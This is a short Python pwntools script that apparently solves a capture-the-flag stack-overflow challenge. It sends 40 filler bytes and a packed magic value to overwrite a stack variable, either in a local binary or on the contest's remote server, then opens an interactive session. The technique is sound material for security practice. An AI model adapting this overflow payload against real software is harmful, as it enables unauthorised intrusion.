from pwn import *
import re

HOST, PORT = "chal.imaginaryctf.org", 42001
BINARY = './stackoverflow'
# context.log_level = 'critical'

def start():    
    if not args.REMOTE:
        print("LOCAL PROCESS")
        return process(BINARY)
    else:
        print("REMOTE PROCESS")
        return remote(HOST, PORT)

def solve():
    p = start()

    payload = b'a' * 40
    payload += p64(0x69637466)
    p.sendlineafter('color?', payload)

    p.interactive()

solve()